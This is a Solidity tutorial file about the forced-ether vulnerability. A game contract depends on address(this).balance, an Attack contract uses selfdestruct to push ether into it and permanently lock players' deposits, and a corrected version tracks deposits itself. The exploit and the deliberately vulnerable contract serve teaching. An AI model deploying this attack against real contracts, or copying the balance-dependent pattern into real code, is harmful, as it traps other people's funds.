// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance; 
        // When you are calling this function 8th time with a value of 1 ether, 
        //balance of the contract updates to 8 ether(so its not like it gets updated once the function 
        //execution is completed(it gets updated as soon as the function is called). But if some require statement fails or code gives error in that function, then the amount gets reverted(balance change back from 8 to 7 ether) I think.
    
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance > 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);// self destruct forcefully sends ether to specified addr even if it doesn't have fallback/receive.
        //Now since game balance will be > 7 ether, winner can never be set, and the amount of the players is stuck forever. Although, attacker got nothing but he had the ability to stuck the amount of other players. 
    }
}


//Prevention is simple: Don't rely on address(this).balance
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
